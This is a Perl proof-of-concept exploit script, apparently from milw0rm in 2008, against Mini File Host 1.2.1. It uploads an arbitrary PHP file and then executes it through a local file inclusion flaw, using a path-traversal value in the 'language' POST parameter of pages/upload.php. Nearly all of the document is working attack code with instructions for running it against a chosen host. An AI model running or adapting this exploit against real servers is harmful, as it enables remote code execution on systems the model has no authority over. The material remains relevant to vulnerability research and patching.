#!/usr/bin/perl
# Name: Mini File Host (1.2.1 "Security Fixed release" and earlier)
# Vulnerability type: Local File Inclusion through POST requests (pages/upload.php)
# Authors: 
#          Scary-Boys: original GET-vulnerability, 2008-01-17
#             shinmai: POST-request vulnerability in latest version
#                      perl POC, 2008-01-19
######################################################################################
# Description:
# The same language=LFI vulnerability is found in 1.2 is present in  thelatest version
# POST has to be used to exploit instead of GET.
#
# This POC is to be used as follows:
# perl mfh121.pl -f FILENAME.PHP -h HOSTNAME -e PATH TO MFH
#
# FILENAME.PHP is uploaded to the target script, and then executed through LFI with
# a POST request.
#
# example: perl mfh121.pl -f ./phpinfo.php -h localhost -p /mfi121/ | less
# The resulting HTML will be printed, all output by phpinfo.php will be before the
# real content.
#
use LWP::UserAgent;
use Getopt::Std;
use vars qw($opt_f $opt_h $opt_p $opt_g);

my $ua;
my $response;
my $formtarget;
my $original_filename;
my $filame;
my $scriptname;
my $exploit_target;

getopts("f:h:p:g");

$original_filename = $opt_f;
$filame = chomp($original_filename);
$formtarget = "http://".$opt_h.$opt_p."upload.php?do=verify";

$ua = LWP::UserAgent->new;

$response = $ua->post( $formtarget,
  [ 'upfile' => [$original_filename], ],
  'Content_Type' => 'form-data'
);

die "error: ", $response->status_line
   unless $response->is_success;
if( $response->content =~ m/\.php\?file=(.*?)\">/ ) {
    $scriptname = "$1";
  } else {
    print "Upload of php file unsuccessful";
    die ($response->status_line);
  }

$scriptname =~ s/\.[\w]{2,4}//;

$exploit_target = "http://".$opt_h.$opt_p."/pages/upload.php";
$response = $ua->post( $exploit_target,
  [ 'language' => "../../storage/".$scriptname, ],
  'Content_Type' => 'form-data'
);
die "error running php file though LFI: ", $response->status_line
   unless $response->is_success;
print $response->content;

exit(0);

# milw0rm.com [2008-01-20]